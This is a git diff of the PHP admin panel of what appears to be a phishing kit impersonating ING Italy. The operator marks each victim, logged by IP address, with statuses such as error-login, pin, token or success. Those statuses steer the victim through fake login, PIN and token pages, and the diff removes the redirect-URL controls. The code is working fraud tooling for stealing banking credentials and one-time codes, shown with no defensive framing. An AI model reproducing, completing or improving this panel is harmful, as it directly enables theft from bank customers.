@@ -5,7 +5,6 @@ require_once "../config.php";
 $ip = $_GET['id_user'];
 
 $jsonFilename = __DIR__ . '/logs/' . str_replace('.', '-', $ip) . '.json';
-$json = file_exists($jsonFilename) ? json_decode(file_get_contents($jsonFilename), true) : [];
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $newStatus = $_POST['status'] ?? null;
@@ -13,30 +12,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($newStatus) && file_exists($jsonFilename)) {
         $json = json_decode(file_get_contents($jsonFilename), true);
         $json['status'] = $newStatus;
-        
-        $statusRedirects = [
-            'error-login' => 'login.php',
-            'pin' => 'pin.php',
-            'error-pin' => 'pin.php',
-            'token' => 'token.php',
-            'error-token' => 'token.php',
-            'success' => $json['redirect_url'] ?? 'https://www.ing.it/'
-        ];
-        
-        if (isset($statusRedirects[$newStatus])) {
-            $json['redirect_to'] = $statusRedirects[$newStatus];
-        }
-        
         file_put_contents($jsonFilename, json_encode($json, JSON_PRETTY_PRINT));
         $msg = "Status updated to $newStatus";
-    }
-    
-    $newRedirectUrl = $_POST['redirect_url'] ?? null;
-    if (isset($newRedirectUrl) && $newRedirectUrl !== '' && file_exists($jsonFilename)) {
-        $json = json_decode(file_get_contents($jsonFilename), true);
-        $json['redirect_url'] = $newRedirectUrl;
-        file_put_contents($jsonFilename, json_encode($json, JSON_PRETTY_PRINT));
-        $msg = "Redirect URL updated";
     }
 }
 ?>
@@ -63,7 +40,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </head>
 
     <body id="beforeUserData" class="">
-        <!-- Start Nav Bar  here-->
+        <!-- Start Nav Bar -->
         <nav>
             <div class="content-nav">
                 <h3><img src="img/favicon.png" alt=""> Admin Dashboard</h3>
@@ -84,14 +61,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 </center>
                 <br>
                 <form method="POST">
-                    <div class="form-group mb-3">
-                        <label style="color: #fff;">Redirect URL:</label>
-                        <input type="text" name="redirect_url" class="form-control" 
-                            value="<?php echo isset($json['redirect_url']) ? htmlspecialchars($json['redirect_url']) : ''; ?>" 
-                            placeholder="https://example.com">
-                        <button type="submit" class="btn btn-sm btn-primary mt-2">Save URL</button>
-                    </div>
-                    <hr style="border-color: #444;">
                     <button type="submit" name="status" class="buttons-control-users button-error"
                         value="error-login">Error
                         Login</button>
